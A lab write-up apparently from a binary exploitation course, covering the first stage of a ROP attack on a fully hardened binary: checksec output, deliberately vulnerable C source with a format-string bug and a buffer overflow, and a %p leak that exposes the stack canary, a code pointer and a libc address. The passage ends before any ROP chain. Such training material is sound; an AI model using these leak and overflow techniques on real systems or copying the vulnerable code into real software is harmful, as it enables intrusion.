# Lab 3 Writeup - ROP with mitigations

This challenge will be significantly harder.

Notice, all mitigations are enabled on this [binary](vuln).

    └──╼ $checksec --file=vuln
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
    Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   45 Symbols	  No	0		2		vuln

Fortunatly, if we take a look at the [source code](vuln.c), there are two critical vulnerabilities.

    void vuln() {
        char buffer[64];
        
        puts("Read 1");
        read(0, buffer, 63);
        printf(buffer);
        
        puts("\nRead 2");
        read(0, buffer, 256); 
    }

In the **vuln()** function, we have a format strings vulnerability that will allow us to leak the contents of the stack, and a buffer overflow that will allow us to overwrite the return address, and execute arbitary code using ROP.

## Stage 1 - Memory Leak
If we supply n %p format specifiers to the program, printf() will print n memory addresses off the stack.

    ┌─[owen@parrot]─[~/Desktop/Binex-BOIL-TechX/lab_3]
    └──╼ $./vuln 
    Read 1
    %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
    0x7ffdeab01450.0x3f.0x7fd667e3129d.(nil).0x7fd667f44680.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.(nil).0x114c4d3e6cc76200.0x7ffdeab014c0.0x5568661ae2b5.(nil).0x114c4d3e6cc76200.0x1.0x7fd667d6024a.
    Read 2
    End of execution.
    ┌─[owen@parrot]─[~/Desktop/Binex-BOIL-TechX/lab_3]
    └──╼ $

Here we can make a few interesting observations. At index 15, we see **0x114c4d3e6cc76200**, a high entropy value ending in 00. This is *almost certainly* the stack canary. At index 17, we see **0x5568661ae2b5**, which looks like an internal pointer, and at index 21 we see **0x7fd667d6024a** which looks like a libc address.

We can verify this in GDB.